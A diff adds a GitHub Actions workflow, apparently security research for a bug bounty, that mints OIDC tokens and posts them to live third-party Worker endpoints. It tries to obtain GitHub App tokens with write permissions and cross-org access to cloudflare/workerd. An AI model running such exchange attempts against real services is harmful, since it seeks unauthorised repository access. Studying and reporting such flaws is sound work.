@@ -1,0 +1,64 @@
+name: oidc-exchange-probe
+# Security research for the Cloudflare public bug bounty programme.
+# Measures what the public ask-bonk OIDC token broker verifies. Read-only:
+# it only POSTs this repository's own short-lived GitHub Actions OIDC token to
+# two public, unauthenticated Worker endpoints and prints the refusal.
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint OIDC tokens and attempt the exchange
+        run: |
+          set -u
+          mint() {
+            curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | sed -E 's/.*"value":"([^"]*)".*/\1/'
+          }
+          show_claims() {
+            S=$(echo "$1" | cut -d. -f2 | tr '_-' '/+')
+            while [ $(( ${#S} % 4 )) -ne 0 ]; do S="${S}="; done
+            echo "$S" | base64 -d; echo
+          }
+          red() { sed -E 's/(ghs_|ghu_|ghp_|github_pat_)[A-Za-z0-9_]+/\1REDACTED_BUT_PRESENT/g'; }
+
+          TOK=$(mint "opencode-github-action")
+          BAD=$(mint "zzz-wrong-audience-control")
+          echo "=== token lengths: expected-audience=${#TOK}  wrong-audience=${#BAD}"
+          echo "=== CLAIMS of the expected-audience token (payload only, signature never printed)"
+          show_claims "$TOK"
+          echo "=== CLAIMS of the wrong-audience control token"
+          show_claims "$BAD"
+
+          for BASE in https://ask-bonk.cloudflare-exponent.workers.dev https://ask-bonk.silverlock.workers.dev; do
+            echo "################ $BASE"
+            echo "--- A) POST /auth/exchange_github_app_token   (valid OIDC, correct aud, repository_owner=0m44r)"
+            curl -sS -o b.txt -w 'HTTP %{http_code}  t=%{time_total}s\n' -X POST "$BASE/auth/exchange_github_app_token" \
+              -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{}'
+            red < b.txt; echo
+            echo "--- B) POST /auth/exchange_github_app_token   (same, asking for contents:write explicitly)"
+            curl -sS -o b.txt -w 'HTTP %{http_code}  t=%{time_total}s\n' -X POST "$BASE/auth/exchange_github_app_token" \
+              -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
+              -d '{"permissions":{"contents":"write","issues":"write","pull_requests":"write"}}'
+            red < b.txt; echo
+            echo "--- C) POST /auth/exchange_github_app_token   (WRONG audience control)"
+            curl -sS -o b.txt -w 'HTTP %{http_code}  t=%{time_total}s\n' -X POST "$BASE/auth/exchange_github_app_token" \
+              -H "Authorization: Bearer $BAD" -H 'Content-Type: application/json' -d '{}'
+            red < b.txt; echo
+            echo "--- D) POST /auth/exchange_github_app_token_for_repo -> cloudflare/workerd (cross-org control)"
+            curl -sS -o b.txt -w 'HTTP %{http_code}  t=%{time_total}s\n' -X POST "$BASE/auth/exchange_github_app_token_for_repo" \
+              -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
+              -d '{"owner":"cloudflare","repo":"workerd"}'
+            red < b.txt; echo
+            echo "--- E) POST /api/github/track with a repo other than the token's (requireRepoMatch control)"
+            curl -sS -o b.txt -w 'HTTP %{http_code}  t=%{time_total}s\n' -X POST "$BASE/api/github/track" \
+              -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
+              -d '{"owner":"cloudflare","repo":"workerd","run_id":1,"run_url":"https://example.invalid/x","issue_number":1,"created_at":1}'
+            red < b.txt; echo
+          done
